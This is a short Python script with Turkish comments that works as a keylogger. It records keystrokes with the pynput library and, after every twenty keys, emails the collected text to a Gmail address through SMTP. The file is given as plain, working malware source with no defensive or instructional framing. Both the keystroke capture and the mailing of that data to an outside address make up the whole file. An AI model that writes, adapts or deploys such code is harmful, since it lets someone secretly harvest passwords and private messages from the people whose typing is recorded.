import smtplib


def sendEmail(message):
    smtp_server = "smtp.gmail.com"
    port = 587
    sender_email = "......@gmail.com"
    password = "sender_email password"
    receiver_email = ".......@gmail.com"

    try:
        server = smtplib.SMTP(smtp_server, port)
        server.ehlo()  # server değişkenini kullanılabilir hale getirdik.
        server.starttls()  # bağlantımızı gizli hale getirdik.
        server.ehlo()
        server.login(sender_email, password)  # yukarda belirttiğimiz maile giriş yapıyoruz
        server.sendmail(sender_email, receiver_email, message)

    except Exception as e:
        print(e)
    finally:
        server.quit()


from pynput.keyboard import Key, Listener

count = 0
keys = []


def on_press(key):
    print(key)
    print("pressed")
    global keys, count
    keys.append(str(key))
    count += 1
    if count > 20:
        count = 0
        email(keys)


def email(keys):
    message = ""
    for key in keys:
        k = key.replace("'", "")
        if key == "Key.space":
            k = " "
        elif key.find("Key") > 0:
            k = ""
        message += k
    print(message)
    sendEmail(message)


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()